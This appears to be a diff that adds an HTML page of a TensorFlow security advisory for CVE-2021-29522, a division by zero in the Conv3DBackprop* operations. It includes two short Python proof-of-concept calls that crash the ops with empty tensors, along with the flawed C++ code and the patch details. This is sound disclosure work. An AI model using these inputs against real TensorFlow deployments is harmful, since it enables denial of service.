@@ -1,0 +1,48 @@
+<h2>TFSA-2021-011: Division by 0 in <code>Conv3DBackprop*</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29522</p>
+<h3>Impact</h3>
+<p>The <code>tf.raw_ops.Conv3DBackprop*</code> operations fail to validate that the input
+tensors are not empty. In turn, this would result in a division by 0:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)
+filter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)
+out_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
+<code></code>python
+import tensorflow as tf</p>
+<p>input_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
+filter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)
+out_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450">implementation</a>
+does not check that the divisor used in computing the shard size is not zero:</p>
+<p><code>cc
+  const int64 size_A = output_image_size * dims.out_depth;
+  const int64 size_B = filter_total_size * dims.out_depth;
+  const int64 size_C = output_image_size * filter_total_size;
+  const int64 work_unit_size = size_A + size_B + size_C;
+  ...
+  const size_t shard_size =
+      use_parallel_contraction
+        ? 1
+        : (target_working_set_size + work_unit_size - 1) / work_unit_size;</code></p>
+<p>Thus, if attacker controls the input sizes, they can trigger a denial of service
+via a division by zero error.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa">311403edbc9816df80274bd1ea8b3c0c0f22c3fa</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
